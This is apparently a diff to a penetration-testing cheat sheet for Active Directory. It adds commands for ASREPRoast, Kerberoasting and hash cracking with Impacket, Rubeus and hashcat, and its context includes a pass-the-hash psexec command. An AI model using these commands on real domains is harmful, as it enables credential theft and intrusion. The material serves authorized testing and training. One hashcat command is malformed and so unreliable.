@@ -2,6 +2,7 @@
 * Sources for this cheat sheet: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
 * Good list of AD pentest commands and tools: https://wadcoms.github.io/
 * Using impacket scripts input Domain Names in **lower case** if connection fails!
+* Rubeus is to be used when remote access to some AD host avialable
 
 # Reconaissance
 
@@ -9,9 +10,9 @@ Understanding the target AD environment is key to further exploitation.
 
 * **Tools**:
 
-* Most important tool: `enum4linux`
-
-`enum4linux -a target_ip > enum.log`
+* crackmapexec
+* Rubeus
+* `enum4linux -a target_ip > enum.log`
 
 * AD recon: https://github.com/sense-of-security/ADRecon
 * Bloodhound: https://github.com/BloodHoundAD/BloodHound
@@ -19,8 +20,11 @@ Understanding the target AD environment is key to further exploitation.
 
 
 ## Domain Controller Discovery
+For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/how-domain-controllers-are-located
 
-* **DNS query**: `nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local`
+
+* **Troubleshooting**: `nltest /dsgetdc:domain.local`
+* **DNS query**: `nslookup -q=srv _ldap._tcp.dc._msdcs.domain.local`
 * **Using nltest**: `nltest /dclist:domain.local`
 
 ## Domain Hosts Discovery
@@ -46,7 +50,25 @@ use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:
 
 `./bloodhound.py -d xxx.local -u xxxxxx -p xxx -gc xxx.xxx.local -c all -ns 10.10.10.xxx`
 
+### Launching Bloodhound and AD Visualization
+
+1. launch neo4j: `sudo neo4j console`
+2. launch GUI: `bloodhound`
+3. click on Upload Data in the upper right corner
+4. Right-Click on free are on the screen and select "Reload Query"
+
 # Exploitation
+
+1. Try attacking Kerberos in this order:
+Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
+
+* Kerberos brute-force
+* ASREPRoast
+* Kerberoasting
+* Pass the key
+* Pass the ticket
+* Silver ticket
+* Golden ticket
 
 ## Brute Force ASREP roast
 
@@ -56,11 +78,15 @@ use Bloodhound.py (https://github.com/fox-it/BloodHound.py) to collect AD info:
 
 ```
 
-   1. Look for users via LDAP
+   1. Look for users via enum4linux
       
    2. Use ASREP roast against users in the ldapenum_asrep_users.txt file
     
-   crackmapexec ldap forest -u users1.txt  -p '' --asreproast ASREProast --kdcHost 10.10.10.161
+	GetNPUsers.py xxx.com/xxx:xxx -usersfile usersall.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.11.1.xxx
+	
+	OR with Rubeus
+	
+	.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
    
    3. Use SPN roast against users in the ldapenum_spn_users.txt file
    
@@ -93,6 +119,35 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 * Use extracted hash to perform pass the hash attack
 
 `psexec.py -hashes aad3b435b51404eeaad3b435b5140xxx:32693b11e6aa90eb43d32c72a07cxxxx "xxx.local/Administrator@10.10.10.xxx"`
+
+## Kerberoasting
+
+* Look for kerberoastable accounts:
+
+`ldapsearch -H ldap://10.11.1.xxx -x -LLL -W -b "dc=xxx,dc=com" "(&(samAccountType=805306368)(servicePrincipalName=*))"`
+ 
+* get TGSs for cracking 
+
+```
+GetUserSPNs.py xxx.com/xxx:xxx -outputfile hashes.kroast -dc-ip 10.11.1.xxx
+
+OR Rubeus
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+```
+
+
+* And finally, crack the hash
+`hashcat -a -m 13100 SPN.hash /wordlists/rockyou.txt`
+
+## Hash cracking
+
+* in most cases pass the hash attack is better as it does not waste time
+
+### MsCacheV2
+
+`hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85fxxx' /usr/share/wordlists/rockyou.txt --force --potfile-disable`
 
 # Lateral Movement
 
